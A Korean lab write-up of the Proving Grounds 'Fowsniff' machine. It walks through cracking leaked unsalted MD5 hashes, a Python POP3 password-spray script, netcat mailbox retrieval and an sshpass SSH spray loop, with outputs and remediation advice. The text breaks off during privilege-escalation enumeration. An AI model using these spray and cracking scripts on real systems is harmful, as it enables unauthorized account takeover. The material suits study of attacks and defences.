---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/enum/dirbust
  - tech/enum/osint
  - tech/cred/crack
  - tech/cred/spray
  - tech/cred/reuse
  - tech/svc/pop3
  - tech/lin/motd
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.18
ports: [22, 80, 110, 143]
services: [http, imap, pop3, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 8
---

> [!info] 요약
> 타겟 `192.168.248.18` · Ubuntu 16.04.4 LTS (Xenial Xerus) · 커널 `4.4.0-116-generic` · Fundamental · 플래그 2개
> 진입점: 유출 해시 덤프(OSINT) → 솔트 없는 MD5 크랙 8/9 → POP3 스프레이로 `seina:scoobydoo2` 통과 → 메일 본문의 SSH 임시 비번 `S1ck3nBluff+secureshell` → SSH `baksteen`
> 권한상승: `gid=100(users)` 가 쓸 수 있는 `/opt/cube/cube.sh` 를 `/etc/update-motd.d/00-header` 가 호출 — sshd 특권 프로세스가 SSH 로그인마다 root 로 실행
> 플래그 값은 **2026-08-20 인스턴스** 기준. PG 는 박스를 다시 켤 때마다 값을 새로 만듦
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.18

### Initial Access – 유출된 솔트 없는 MD5 덤프를 크랙해 POP3 메일함에 들어가고, 메일 본문의 평문 SSH 임시 비밀번호로 로그인

**Vulnerability Explanation:** 세 결함이 체인됨.
- 사내 계정 비밀번호가 **솔트 없는 MD5** 로 저장돼 유출됨 — 솔트가 없으므로 같은 평문은 항상 같은 해시. 후보 단어 하나를 한 번 해싱해 9개 전부와 대조 가능하고, 사전 단어당 비용이 계정 수와 무관함. rockyou 로 1초 미만에 9개 중 8개 복원
- 유출을 인지하고도 **강제 만료가 아닌 「바꾸라는 안내」에 그침** — 한 계정(`seina`)이 옛 비밀번호를 유지해 스프레이 8회 중 1회 통과
- Dovecot POP3 가 TLS 없이 평문 `USER`/`PASS` 를 받고(`pop3-capabilities` 의 `USER` · `SASL(PLAIN)`), 그 메일함 안에 **전 직원 공용 SSH 임시 비밀번호가 평문으로** 들어 있음. 메일함이 셸이 아니라 다음 자격증명의 저장소임

**Vulnerability Fix:**
- 비밀번호를 bcrypt/argon2 로 저장. 솔트 없는 MD5 금지 — 유출 시 저장 방식이 대응 시간을 결정함
- 유출 인지 시 안내가 아니라 **강제 만료**(`chage -d 0 <user>`). 9명 중 8명이 바꿨고 1명이 안 바꿔 전체가 뚫림
- 임시 비밀번호를 메일 본문으로, 그것도 전 직원 동일 값으로 배포 금지. 계정별로 다르게 발급하고 대역 외로 전달
- Dovecot 에 `disable_plaintext_auth = yes` + TLS 강제. auth penalty 는 스프레이를 늦출 뿐 막지 못함 — 소켓 타임아웃을 40초로 올린 것 하나로 우회됨

**Severity:** High — 무인증 원격에서 유효 SSH 자격증명 획득, 즉시 대화형 셸로 이어짐

**Steps to reproduce the attack:**
1. 웹 루트 본문에서 유출 사건 서사와 `@fowsniffcorp` 계정 지목 확인
2. 공개 미러에서 `user@fowsniff:<md5>` 9쌍 회수
3. `john --format=raw-md5 --wordlist=rockyou.txt hashes.txt` → 8개 복원
4. 평문을 다시 MD5 해싱해 덤프와 대조, `user:pass` 짝 재조합
5. POP3(110) 에 8쌍 스프레이 → `seina:scoobydoo2` 만 `+OK Logged in.`
6. `LIST`/`RETR` 로 메일 2통 회수 → SSH 임시 비번 `S1ck3nBluff+secureshell`
7. `users.txt` 9명 전원에 SSH 스프레이 → `baksteen` 성공

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.18 | TCP: 22, 80, 110, 143 |

먼저 top-200 으로 방향만 잡음(7.9초).

```bash
nmap -sV -Pn --top-ports 200 --min-rate 3000 -oN quick.log 192.168.248.18
```

```text
# Nmap 7.98 scan initiated Thu Aug 20 14:53:46 2026 as: /usr/lib/nmap/nmap --privileged -sV -Pn --top-ports 200 --min-rate 3000 -oN quick.log 192.168.248.18
Nmap scan report for 192.168.248.18
Host is up (0.087s latency).
Not shown: 196 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3    Dovecot pop3d
143/tcp open  imap    Dovecot imapd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 20 14:53:54 2026 -- 1 IP address (1 host up) scanned in 7.90 seconds
```
— 출처: `~/PG/Fowsniff/quick.log`

동시에 전포트 스캔.

```bash
nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.18
```

```text
# Nmap 7.98 scan initiated Thu Aug 20 14:53:37 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.18
Nmap scan report for 192.168.248.18
Host is up (0.084s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Fowsniff Corp - Delivering Solutions
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: CAPA AUTH-RESP-CODE PIPELINING UIDL RESP-CODES TOP USER SASL(PLAIN)
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: OK SASL-IR AUTH=PLAINA0001 post-login have more capabilities listed ENABLE Pre-login LITERAL+ IMAP4rev1 LOGIN-REFERRALS IDLE ID
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=8/20%OT=22%CT=1%CU=33581%PV=Y%DS=4%DC=T%G=Y%TM=6A86968
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=Z%CI=I%TS=8)SEQ(SP=1
OS:00%GCD=1%ISR=10E%TI=Z%CI=I%TS=8)SEQ(SP=107%GCD=4%ISR=10A%TI=Z%CI=I%TS=8)
OS:SEQ(SP=109%GCD=1%ISR=109%TI=Z%CI=I%TS=8)SEQ(SP=109%GCD=1%ISR=10D%TI=Z%CI
OS:=I%TS=8)OPS(O1=M578ST11NW7%O2=M578ST11NW7%O3=M578NNT11NW7%O4=M578ST11NW7
OS:%O5=M578ST11NW7%O6=M578ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%
OS:W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M578NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%R
OS:D=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=
OS:0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID
OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   83.98 ms 192.168.45.1
2   83.73 ms 192.168.45.254
3   84.07 ms 192.168.251.1
4   84.15 ms 192.168.248.18

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 20 14:54:18 2026 -- 1 IP address (1 host up) scanned in 41.12 seconds
```
— 출처: `~/PG/Fowsniff/nmap.log`. `nmap.full.txt` 는 같은 스캔의 stdout 사본으로 첫 줄·마지막 줄의 형식만 다름

두 줄이 방향을 정함.

`pop3-capabilities` 의 **`USER`** — Dovecot 이 평문 `USER`/`PASS` 를 받는다는 뜻임. 이게 없으면 SASL 만 남아 스프레이 스크립트를 다르게 짜야 함. `SASL(PLAIN)` 도 같이 있으니 평문 인증이 TLS 없이 허용돼 있음.

**버전 판정 독립 근거 2개** — ① `OpenSSH 7.2p2 Ubuntu 4ubuntu2.4` + `Apache 2.4.18 (Ubuntu)` 배너 조합이 Xenial(16.04) 을 가리킴. ② 셸 획득 후 `/etc/os-release` · `uname -a` 로 확인 — `16.04.4 LTS (Xenial Xerus)` · `4.4.0-116-generic`(`enum_baksteen.log` `---OS`). 배너 하나로 단정하지 않고 두 서비스가 같은 릴리스를 가리키는지 본 뒤 내부 확인으로 닫음.

> [!note] `-p-` 가 여기서는 아무것도 더 주지 않았다
> top-200 이 7.9초에 22/80/110/143 을 전부 찾았고, 전포트 스캔 41초의 결과도 같은 4개였음(`quick.log` vs `nmap.log`). `-p-` 는 여전히 기본기지만 **이 박스에서 그게 결정적이었다고 쓰면 거짓말**이 됨. 비용도 41초라 없었음.

#### 웹 (80)

루트는 HTML5UP 의 "Escape Velocity" 템플릿을 그대로 얹은 정적 페이지. 본문이 서사를 줌.

> Fowsniff's internal system suffered a data breach that resulted in the exposure of employee usernames and passwords.
>
> The attackers were also able to hijack our official **@fowsniffcorp** Twitter account.

여기가 이 박스의 유일한 진짜 힌트임. **자격증명은 박스 안이 아니라 밖에 있음.**

```bash
gobuster dir -u http://192.168.248.18/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html -t 40 -o gobuster.log
```

```text
/images              (Status: 301) [Size: 317] [--> http://192.168.248.18/images/]
/index.html          (Status: 200) [Size: 2629]
/security.txt        (Status: 200) [Size: 459]
/assets              (Status: 301) [Size: 317] [--> http://192.168.248.18/assets/]
/README.txt          (Status: 200) [Size: 1288]
/robots.txt          (Status: 200) [Size: 26]
/LICENSE.txt         (Status: 200) [Size: 17128]
```
— 출처: `~/PG/Fowsniff/gobuster.log` (원문의 ANSI 색상 이스케이프만 제거)

`README.txt`·`LICENSE.txt` 는 템플릿 원본 파일임.

```text
Escape Velocity by HTML5 UP
html5up.net | @ajlkn
Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)


A new responsive template featuring a flat (but not too flat) minimalistic design, spacious
layout, and styling for all basic page elements. Its demo images* are courtesy of the supremely
talented photographer Felicia Simion. If you like photography or just enjoy being blown away by
awesome stuff, check out her portfolio for more stunning images:
```
— 출처: `~/PG/Fowsniff/README.txt` (1288바이트 중 앞 10행)

`robots.txt` 는 26바이트고 nmap 이 `1 disallowed entry` `/` 로 읽음. `[가정]` 파일 본문은 회수하지 않았으나 `User-agent: *` + `Disallow: /` 두 줄이 개행 포함 정확히 26바이트라 그 내용으로 봄. 박스가 심어둔 것은 `security.txt` 하나뿐이고 내용은 자랑임.

```text
       WHAT SECURITY?

            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |
|       .oooO                |
|        (   )   Oooo.       |
+---------\ (----(   )-------+
           \_)    ) /
                 (_/


Fowsniff Corp got pwn3d by B1gN1nj4!


No one is safe from my 1337 skillz!
```
— 출처: `~/PG/Fowsniff/security.txt`

**동적 페이지가 하나도 없음.** PHP 도, 폼도, 파라미터도 없음. 웹은 서사 전달용이고 공격면이 아님.

#### 유출 덤프 확보 (OSINT)

페이지가 지목한 `@fowsniffcorp` 계정에서 공격자가 pastebin 으로 덤프를 뿌렸다는 것이 원 시나리오임. 원본 paste(`pastebin.com/raw/NrAqVeeX`)는 404 로 삭제돼 있어 공개 미러에서 9쌍을 복원함.

```text
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```
— 출처: `~/PG/Fowsniff/dump.txt`

해시만 잘라낸 것이 `hashes.txt`, 사용자명만 잘라낸 것이 `users.txt` 임.

### Initial Access – POP3 메일함 → SSH

#### 해시 크랙

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

```text
Loaded 9 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])
scoobydoo2       (?)
orlando12        (?)
apples01         (?)
skyler22         (?)
mailcall         (?)
07011972         (?)
carp4ever        (?)
bilbo101         (?)
8g 0:00:00:00 DONE (2026-08-20 14:56) 9.411g/s 16874Kp/s 16874Kc/s 43155KC/s
```
— 출처: john 실행 stdout(파일 미보존). 실행 자체는 `~/.john/john.log` 에 남음 — `Loaded a total of 9 password hashes with no different salts` · `Command line: john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt` · `Hash type: Raw-MD5` · `Algorithm: MD5 128/128 AVX 4x3`

9개 중 8개, 1초 미만. `stone` 만 rockyou 밖임.

출력 순서는 크랙 난이도가 아니라 **rockyou 안의 행 순서**임 — wordlist 모드는 파일을 위에서 아래로 훑음. 8개 평문의 rockyou 행번호를 뽑아보면 출력 순서와 정확히 일치함(행번호 실측치는 [[_PLAYBOOK]] 크래킹 항목).

`--format=raw-md5` 를 빼면 john 이 형식 자동판정에 들어감. 32자 hex 는 raw-MD5·NTLM·LM 등 여러 형식과 모양이 같아 엉뚱한 형식을 고르거나 사용자에게 되묻음. 아는 형식이면 명시하는 편이 항상 빠름.

**`--show` 는 평문만 뱉고 사용자와 짝지어 주지 않음.** john 에 넣은 것이 해시만 담긴 파일이라 그럼 — `john_cracked.txt` 의 사용자 자리가 `?` 로 남은 것이 그 증거임.

```text
?:mailcall
?:bilbo101
?:apples01
?:skyler22
?:scoobydoo2
?:carp4ever
?:orlando12
?:07011972

8 password hashes cracked, 1 left
```
— 출처: `~/PG/Fowsniff/john_cracked.txt`. 이 순서는 크랙 순서가 아니라 `hashes.txt` 입력 순서임(`stone` 만 빠짐)

짝을 되살리려면 평문을 다시 해싱해 덤프와 대조함.

```python
import hashlib
plains=['mailcall','bilbo101','apples01','skyler22','scoobydoo2','carp4ever','orlando12','07011972']
m={hashlib.md5(p.encode()).hexdigest():p for p in plains}
for line in open('dump.txt'):
    u,h=line.strip().split(':'); u=u.split('@')[0]
    print(f'{u}:{m.get(h,"<UNCRACKED>")}')
```

```text
mauer:mailcall
mustikka:bilbo101
tegel:apples01
baksteen:skyler22
seina:scoobydoo2
stone:<UNCRACKED>
mursten:carp4ever
parede:orlando12
sciana:07011972
```
— 출처: `~/PG/Fowsniff/creds.txt` (위 스크립트 출력을 그대로 저장한 것)

`user:hash` 형식 파일을 그대로 john 에 주고 `--show` 를 쓰면 john 이 짝을 유지해 줌. 해시만 잘라 넣었으면 이 재조합 단계가 필요함.

#### POP3 스프레이

`USER`/`PASS` 를 순서대로 보내고 두 번째 응답만 보면 됨. 성공은 `+OK`, 실패는 `-ERR [AUTH] Authentication failed.`

디스크에 남은 스크립트 원문 — 타임아웃을 고친 뒤의 최종본이라 `40` 과 `sleep(3)` 이 들어 있음.

```python
#!/usr/bin/env python3
import socket, sys
HOST='192.168.248.18'; PORT=110
def rd(s):
    d=b''
    while not d.endswith(b'\r\n'): d+=s.recv(4096)
    return d.decode(errors='replace').strip()
import time
for line in open('creds.txt'):
    u,p=line.strip().split(':',1)
    if p.startswith('<'): continue
    s=socket.create_connection((HOST,PORT),40); rd(s)
    s.sendall(f'USER {u}\r\n'.encode()); r1=rd(s)
    s.sendall(f'PASS {p}\r\n'.encode()); r2=rd(s)
    print(f'{u:10} {p:12} -> {r2}')
    try: s.sendall(b'QUIT\r\n'); s.close()
    except: pass
    time.sleep(3)
```
— 출처: `~/PG/Fowsniff/pop3spray.py`

`create_connection` 의 세 번째 인자가 소켓 타임아웃임. 처음엔 8초로 짰다가 세 번째 계정에서 죽었음 — 원인과 정확한 수치는 [[_PLAYBOOK]] 의 스프레이 항목에.

`if p.startswith('<'): continue` 는 `creds.txt` 의 `stone:<UNCRACKED>` 를 건너뜀. 안 풀린 계정을 그대로 쏘면 실패 카운트만 하나 더 쌓임 — 그 카운트가 뒤 계정의 인증 지연을 키움.

```text
mauer      mailcall     -> -ERR [AUTH] Authentication failed.
mustikka   bilbo101     -> -ERR [AUTH] Authentication failed.
tegel      apples01     -> -ERR [AUTH] Authentication failed.
baksteen   skyler22     -> -ERR [AUTH] Authentication failed.
seina      scoobydoo2   -> +OK Logged in.
mursten    carp4ever    -> -ERR [AUTH] Authentication failed.
parede     orlando12    -> -ERR [AUTH] Authentication failed.
sciana     07011972     -> -ERR [AUTH] Authentication failed.
```
— 출처: `~/PG/Fowsniff/try2_pop3spray.log`

8명 중 `seina` 하나. 나머지는 유출 이후 비번을 바꿈 — 왜 `seina` 만 안 바꿨는지는 메일함에 답이 있음.

**수동 대안(도구 금지 대비)** — python 없이 netcat 만으로 동일함. `USER`·`PASS` 두 줄이면 인증이 끝나고 응답 문자열도 같음(`+OK Logged in.` / `-ERR [AUTH] Authentication failed.`, 아래 메일 회수 블록의 첫 세 줄이 그 응답임).

```bash
printf 'USER seina\r\nPASS scoobydoo2\r\nQUIT\r\n' | nc 192.168.248.18 110
```

#### 메일함 읽기

POP3 는 명령 4개면 끝남. `LIST` 로 번호와 크기, `RETR <n>` 으로 본문.

```bash
(printf 'USER seina\r\nPASS scoobydoo2\r\nLIST\r\n'; sleep 4; \
 printf 'RETR 1\r\n'; sleep 3; printf 'RETR 2\r\n'; sleep 3; \
 printf 'QUIT\r\n'; sleep 2) | nc 192.168.248.18 110
```

```text
+OK Welcome to the Fowsniff Corporate Mail Server!
+OK
+OK Logged in.
+OK 2 messages:
1 1622
2 1280
```
— 출처: `~/PG/Fowsniff/mail_seina.txt` (앞 6행)

응답이 넷인 이유 — 배너, `USER` 에 대한 `+OK`, `PASS` 에 대한 `+OK Logged in.`, 그리고 `LIST` 결과임. `USER` 응답이 그냥 `+OK` 라는 것은 **그 계정이 있든 없든 같다**는 뜻이라 사용자 열거에는 못 씀.

`sleep` 이 필요한 이유 — 파이프로 몰아넣으면 클라이언트가 서버 응답을 기다리지 않고 전부 밀어버림. POP3 는 파이프라이닝을 지원하지만 `nc` 는 응답을 다 받기 전에 EOF 로 연결을 닫아 출력이 잘림. 각 단계 사이에 `sleep` 을 끼워 응답을 받아냄.

1번 메일 — `stone@fowsniff` 가 전 직원에게 보낸 `URGENT! Security EVENT!`

```text
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
	id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone
```
— 출처: `~/PG/Fowsniff/mail_seina.txt`

수신자 8명 전원이 후보임. 2번 메일이 그중 누구인지를 좁혀줌 — `baksteen`(Skyler)이 `seina`(Devin)에게 보낸 잡담임.

```text
+OK 1280 octets
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
	id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff
```
```text
I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.
```
— 출처: `~/PG/Fowsniff/mail_seina.txt` (2번 메일의 헤더 블록과 본문 6번째 문단)

**`baksteen` 은 stone 의 메일을 아직 안 읽음 = 임시 비번을 안 바꿈.** 이것이 정답 계정이라는 강한 신호임. 다만 신호를 믿고 하나만 찔러볼 이유는 없음 — 9명 전부 돌림.

#### SSH 스프레이

```bash
for u in $(cat users.txt); do
  r=$(sshpass -p 'S1ck3nBluff+secureshell' ssh -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 \
        -o PreferredAuthentications=password -o PubkeyAuthentication=no \
        $u@192.168.248.18 'id' 2>&1 | tr '\n' ' ')
  echo "$u => $r"
done
```

`-o PreferredAuthentications=password -o PubkeyAuthentication=no` 를 붙이는 이유 — 이걸 빼면 Kali 의 `~/.ssh/id_*` 를 먼저 시도함. 서버 기본값 `MaxAuthTries 6` 안에서 키 시도가 자리를 먹으면 비밀번호가 닿기 전에 연결이 끊길 수 있고, 실패 원인도 헷갈림. 스프레이할 때는 인증 방식을 하나로 고정할 것.

`-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null` 은 한 쌍으로 씀. `StrictHostKeyChecking=no` 만으로는 **키가 바뀌었을 때** 막히는 것을 못 풂 — PG 는 리버트마다 호스트키가 새로 생기고, 그때 `REMOTE HOST IDENTIFICATION HAS CHANGED` 가 뜨면 비밀번호 인증 자체가 거부됨. `/dev/null` 을 물리면 매 연결이 빈 `known_hosts` 로 시작해 그 상태가 아예 생기지 않고, 내 `known_hosts` 도 더럽히지 않음. 대가는 **매 연결마다 경고가 출력에 섞이는 것**임.

```text
mauer => Warning: Permanently added '192.168.248.18' (ED25519) to the list of known hosts. ** WARNING: connection is not using a post-quantum key exchange algorithm. ** This session may be vulnerable to "store now, decrypt later" attacks. ** The server may need to be upgraded. See https://openssh.com/pq.html Permission denied, please try again. 
baksteen => Warning: Permanently added '192.168.248.18' (ED25519) to the list of known hosts. ** WARNING: connection is not using a post-quantum key exchange algorithm. ** This session may be vulnerable to "store now, decrypt later" attacks. ** The server may need to be upgraded. See https://openssh.com/pq.html uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen) 
```
— 출처: `~/PG/Fowsniff/try3_ssh_spray.log` (9행 중 2행 발췌). 나머지 7행(`mustikka`·`tegel`·`seina`·`stone`·`mursten`·`parede`·`sciana`)은 계정명만 다르고 `mauer` 행과 글자까지 동일함

`2>&1 | tr '\n' ' '` 로 한 줄로 눌러놨기 때문에 경고와 결과가 같은 줄에 붙음. 스프레이 결과를 눈으로 훑을 것이면 `grep -o 'uid=[^ ]*'` 같은 것을 뒤에 붙이는 편이 나음 — 경고 문구가 길어서 성공 한 줄이 묻힘.

`baksteen` 으로 SSH 진입. 메일 본문이 예측한 그대로임.

**Local.txt value:**
`242f9f051ef3715bbe679c90a3a6adf9`

```text
baksteen
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
fowsniff
192.168.248.18 
Thu Aug 20 02:03:59 EDT 2026
242f9f051ef3715bbe679c90a3a6adf9
```
— 출처: `~/PG/Fowsniff/proof_user.txt` (`whoami; id; hostname; hostname -I; date; cat /home/baksteen/local.txt` 한 줄 실행)

⚠️ 이 회수는 SSH **원격 명령**(`ssh … 'cmd' > proof_user.txt`)으로 실행됨. 근거 셋 — ① 파일에 타겟 pty 프롬프트가 없음 ② 파일 전체가 LF 단독이라 pty 를 거치지 않았음(같은 세션의 `enum_baksteen.log`·`enum2_writable.log` 는 ssh 클라이언트 메시지 줄이 CRLF) ③ 파일 mtime `15:03:59`(KST)과 파일 안 타겟 `date` `02:03:59`(EDT)이 **초 단위까지 같음** — 원격 출력이 Kali 파일로 바로 리다이렉트됐다는 뜻임. 웹셸이 아니라 SSH 세션이므로 OSCP 증거 요건에는 문제가 없으나, 「대화형 셸에서 읽었다」를 증명하는 프롬프트는 root 쪽(`proof_root.txt`)에만 남아 있음. 타겟 시계는 EDT 로 설정돼 Kali(KST)와 13시간 차임 — 두 시각이 어긋난 것이 아니라 같은 순간임.

### Privilege Escalation – MOTD 체인이 부르는 그룹 쓰기 가능 스크립트 (`/opt/cube/cube.sh`)

**Vulnerability Explanation:** MOTD 생성 체인이 비특권 사용자가 쓸 수 있는 파일을 root 로 실행함.
- `/etc/update-motd.d/00-header`(root:root 755)가 원본 Canonical 스크립트의 `printf` 줄을 주석 처리하고 맨 아래에 `sh /opt/cube/cube.sh` 를 추가해 둠
- 그 `/opt/cube/cube.sh` 가 `-rw-rwxr-- parede:users`(모드 674) — 소유자는 실행조차 못 하는데 그룹 `users` 는 `rwx` 임. 손으로 잘못 준 권한의 전형
- `baksteen` 의 **기본 그룹이 `users`(gid 100)** 라 이 파일에 쓸 수 있음. 여러 계정이 같은 기본 그룹을 공유하는 구성이 원인
- 실행 주체는 pam_motd 가 아니라 **sshd 특권 프로세스**임 — SSH 로그인마다 root 로 `run-parts /etc/update-motd.d` 를 돌려 `/run/motd.dynamic` 을 재생성함. 즉 트리거가 시간이 아니라 **내 로그인**이라 즉시 발동 가능

**Vulnerability Fix:**
- `/opt/cube/cube.sh` 를 `root:root 755` 로. MOTD 체인에서 실행되는 모든 파일과 **그 상위 디렉터리**가 비특권 사용자에게 쓰기 불가여야 함 — 파일 권한만 고치고 디렉터리를 놔두면 지우고 새로 만들 수 있어 부족함
- 공유 기본 그룹을 없앨 것. 계정마다 자기 이름 그룹을 기본으로 주고 공유가 필요하면 보조 그룹으로 명시. `users` 를 기본 gid 로 쓰면 「모두가 쓸 수 있는 파일」이 의도치 않게 늘어남

**Severity:** Critical — 저권한 SSH 계정에서 즉시 root. 트리거가 자기 로그인이라 대기 시간도 없음

**Steps to reproduce the attack:**
1. `id` 로 기본 그룹이 `users`(gid 100)임을 확인
2. `find / -group users -writable` → `/opt/cube/cube.sh`
3. `/etc/update-motd.d/00-header` 가 `sh /opt/cube/cube.sh` 를 호출하는 것을 확인
4. `cube.sh` 를 백업한 뒤 끝에 리버스셸 한 줄을 append
5. Kali 에 tmux 리스너 기동 후 `baksteen` 으로 SSH 재로그인 → root 셸

#### 셸 직후 열거

한 번에 몰아 실행하고 파일 하나로 회수함. 구분자(`---SUID` 등)는 `echo` 로 끼운 것임.

```text
Warning: Permanently added '192.168.248.18' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
---SUDO
[sudo] password for baksteen: SoConnection to 192.168.248.18 closed.
 fowsniff.
---SUID
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/bin/ntfs-3g
/bin/ping6
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/procmail
/usr/bin/sudo
/usr/bin/chsh
---CAP
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
---CRON
no crontab for baksteen
..
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
total 16
drwxr-xr-x  2 root root 4096 Mar  8  2018 .
drwxr-xr-x 88 root root 4096 Feb 20  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  191 Mar  8  2018 popularity-contest
---HOME
/home:
total 44
drwxr-xr-x 11 root     root     4096 Mar  8  2018 .
drwxr-xr-x 22 root     root     4096 Mar  9  2018 ..
drwxrwx---  5 baksteen baksteen 4096 Jul  9  2020 baksteen
